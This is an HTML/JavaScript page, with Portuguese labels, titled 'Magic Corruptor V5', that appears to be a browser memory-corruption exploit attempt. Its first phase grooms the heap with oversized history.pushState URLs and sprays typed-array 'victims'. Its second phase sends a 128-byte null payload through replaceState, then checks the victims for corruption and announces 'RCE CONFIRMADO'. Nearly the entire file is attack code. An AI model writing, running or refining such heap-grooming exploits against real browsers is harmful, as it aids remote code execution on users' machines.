<!DOCTYPE html>
<html>
<head>
    <title>Magic Corruptor V5 (Replica 6-3-1)</title>
    <style>
        body { background-color: #050505; color: #00ff00; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #333; padding: 10px; height: 450px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px;}
        .btn { 
            padding: 15px; font-size: 1.1em; cursor: pointer; 
            background: #111; color: #fff; border: 2px solid #00ff00; margin: 5px; width: 100%;
        }
        .btn-atk { border-color: #ff0000; color: #ff0000; }
        .btn:hover { background: #222; }
    </style>
</head>
<body>

<h1>Magic Corruptor V5 (Replica)</h1>
<p>Parâmetros Originais: Start 1000 | Step 5000 | Max 46000</p>

<button class="btn" onclick="runPhase1()">1. EXECUTAR SEQUÊNCIA (Teste 6 + 3)</button>
<button class="btn btn-atk" onclick="runPhase2()">2. ATAQUE FINAL (Teste 1 - 128 Bytes)</button>

<div id="log">Pronto.</div>

<script>
    const BASE_OFFSET = 709522; 
    var victims = []; 

    function log(msg, type='') {
        const el = document.getElementById('log');
        const color = type === 'win' ? '#ffff00' : (type === 'err' ? '#ff5555' : '#00ff00');
        el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        el.scrollTop = el.scrollHeight;
    }

    async function wait(ms) { return new Promise(r => setTimeout(r, ms)); }

    function makeSafePayload(size) {
        let s = "";
        for(let i=0; i<size; i++) s += String.fromCharCode((i % 32) + 1);
        return s;
    }

    // --- FASE 1: A SEQUÊNCIA MÁGICA ---
    async function runPhase1() {
        log("=== INICIANDO RÉPLICA (TESTE 6) ===", 'win');
        victims = [];
        
        // PARÂMETROS ORIGINAIS DO LOG
        const START_SIZE = 1000;
        const STEP_SIZE = 5000;
        const MAX_SIZE = 46000; 

        try {
            // Loop exato do Teste 6
            for(let size = START_SIZE; size <= MAX_SIZE; size += STEP_SIZE) {
                
                // 1. O Push (Grooming)
                let payload = "/" + "A".repeat(BASE_OFFSET) + makeSafePayload(size);
                
                try {
                    history.pushState({}, `groom_${size}`, payload);
                    log(`[Teste 6] Alocado: ${size} bytes`);
                } catch(e) {
                    log(`[!] Limite atingido em ${size}. Continuando...`);
                }
                
                // 2. INJEÇÃO DE VÍTIMAS (No meio do processo)
                // Como o passo é grande (5000), precisamos de MUITAS vítimas para preencher o vão
                // Criamos um bloco denso de vítimas após cada push
                
                for(let k=0; k<50; k++) {
                    // Vítima Pequena (Alvo principal do overflow curto)
                    let v1 = new Uint32Array(32); 
                    v1.fill(0x11111111); v1.tag = `S_${size}_${k}`;
                    victims.push(v1);

                    // Vítima Média (Para garantir alinhamento)
                    let v2 = new Uint32Array(256); 
                    v2.fill(0x22222222); v2.tag = `M_${size}_${k}`;
                    victims.push(v2);
                }
                
                await wait(50); // Pausa igual ao teste original
            }
        } catch(e) {
            log(`[!] Erro: ${e.message}`, 'err');
        }

        log("=== APLICANDO PADRÕES (TESTE 3) ===", 'win');
        await wait(500);

        // Réplica do Teste 3 (Compactação com caracteres de controle)
        // O Teste 3 usava payloads pequenos e repetitivos
        for(let i=0; i<20; i++) {
            let controlPayload = "\x00\x09\x0A\x0D\x20".repeat(100); // 500 bytes
            let p = "/" + "A".repeat(BASE_OFFSET) + controlPayload;
            history.pushState({}, `pattern_${i}`, p);
        }
        
        log("MEMÓRIA PREPARADA COMO NO ORIGINAL. Aguarde 3s...", 'win');
    }

    // --- FASE 2: O ATAQUE ---
    async function runPhase2() {
        log("=== DISPARANDO (TESTE 1 - REPLACE) ===", 'win');
        let success = false;
        
        try {
            let buffer = "A".repeat(BASE_OFFSET);
            let attack = "\x00".repeat(128); // 128 Zeros (Você confirmou que aceita)
            
            // Usamos replaceState porque a memória deve estar cheia (como no erro anterior)
            log("Enviando Payload de 128 bytes...");
            
            // Rajada rápida
            for(let k=0; k<10; k++) {
                history.replaceState({}, `PWN_${k}`, "/" + buffer + attack);
            }
            await wait(200);
            
            log(`Verificando ${victims.length} vítimas...`);
            
            // VERIFICAÇÃO
            // Checamos de trás para frente (topo da pilha)
            for(let i=victims.length - 1; i >= 0; i--) {
                let v = victims[i];
                if (!v) continue;

                // 1. Checa Tamanho (Header)
                let expectedLen = v.tag.startsWith("S") ? 32 : 256;
                if (v.length !== expectedLen) {
                    log(`!!! JACKPOT !!! [${v.tag}] TAMANHO MUDOU: ${v.length}`, 'win');
                    success = true;
                }
                
                // 2. Checa Conteúdo (Data)
                let expectedVal = v.tag.startsWith("S") ? 0x11111111 : 0x22222222;
                if (v[0] !== expectedVal) {
                    log(`!!! JACKPOT !!! [${v.tag}] CONTEÚDO ZERADO! Valor: 0x${v[0].toString(16)}`, 'win');
                    success = true;
                }

                if (success) {
                    alert("RCE CONFIRMADO! Vítima corrompida.");
                    break;
                }
            }
            
            if(!success) log("[-] Sem corrupção. O alinhamento foi restaurado, mas o alvo foi perdido. Tente novamente.");

        } catch(e) {
            log(`[!] Erro no ataque: ${e.message}`, 'err');
        }
    }
</script>
</body>
</html>
